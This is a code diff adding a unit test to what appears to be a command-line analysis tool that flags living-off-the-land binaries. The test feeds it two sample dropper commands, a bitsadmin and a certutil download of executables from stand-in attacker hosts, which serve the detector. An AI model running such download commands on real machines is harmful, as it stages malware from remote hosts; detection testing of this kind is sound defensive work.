@@ -463,6 +463,20 @@ def test_extract_binaries_keeps_command_position_tokens():
     assert extract_binaries("cat /etc/passwd | grep root") == ["cat", "grep"]
 
 
+def test_extract_binaries_picks_up_extensionless_lolbins():
+    # bitsadmin / certutil are invoked without .exe in nearly every real
+    # incident report — they MUST be extracted so the LOLBAS panel can fire.
+    bins = extract_binaries(
+        'bitsadmin /transfer "WindowsUpdate" /download /priority normal '
+        'hxxp://update-svc[.]xyz/patch.exe C:\\Windows\\Temp\\patch.exe'
+    )
+    assert "bitsadmin.exe" in bins
+    assert "patch.exe" in bins
+
+    bins = extract_binaries("certutil -urlcache -split -f http://evil.com/p.exe p.exe")
+    assert "certutil.exe" in bins
+
+
 # ── Regression: benign HTTP downloads are not high-confidence droppers ────────
 
 def test_benign_invoke_webrequest_not_malicious():
